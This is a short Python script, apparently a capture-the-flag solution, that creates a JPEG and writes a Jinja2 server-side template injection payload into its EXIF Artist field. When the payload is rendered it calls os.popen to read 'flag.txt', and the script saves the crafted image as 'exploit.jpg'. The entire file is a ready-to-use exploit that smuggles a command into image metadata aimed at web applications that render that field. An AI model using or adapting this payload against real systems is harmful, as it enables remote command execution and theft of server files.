from PIL import Image
import piexif
from io import BytesIO

img = Image.new("RGB", (100, 100), color='white')
img.save("tmp.jpg", format="jpeg") 

payload = "{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"
exif_dict = {"0th": {piexif.ImageIFD.Artist: payload.encode()}, "Exif": {}, "GPS": {}, "1st": {}}
exif_bytes = piexif.dump(exif_dict)

piexif.insert(exif_bytes, "tmp.jpg", "exploit.jpg")
